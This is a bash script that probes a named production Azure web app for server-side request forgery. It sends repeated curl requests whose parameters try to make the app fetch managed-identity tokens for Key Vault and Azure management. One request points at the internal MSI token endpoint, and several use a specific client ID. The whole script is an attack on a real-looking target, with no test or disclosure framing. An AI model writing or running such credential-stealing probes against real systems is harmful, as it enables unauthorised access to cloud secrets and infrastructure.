#!/usr/bin/env bash
set -uo pipefail
B=https://app-tbl-reporting-prod.azurewebsites.net
p () {
  echo "--- $1"
  curl -sS -o /tmp/r -w "HTTP %{http_code}\n" "$B$1" --max-time 30 || true
  head -c 1100 /tmp/r; echo; echo
}
p "/"
p "/?resource=https://vault.azure.net"
p "/?resource=https%3A%2F%2Fvault.azure.net"
p "/?resource=https://management.azure.com"
p "/?client_id=7a85156a-01c4-4e61-8472-40a92107159b"
p "/?resource=https://vault.azure.net&client_id=7a85156a-01c4-4e61-8472-40a92107159b"
p "/?endpoint=http://169.254.131.11:8081/msi/token"
p "/?url=http://169.254.131.11:8081/msi/token"
p "/?api-version=2019-08-01"
p "/?resource=https://vault.azure.net&api-version=2019-08-01&client_id=7a85156a-01c4-4e61-8472-40a92107159b"
echo "=== done ==="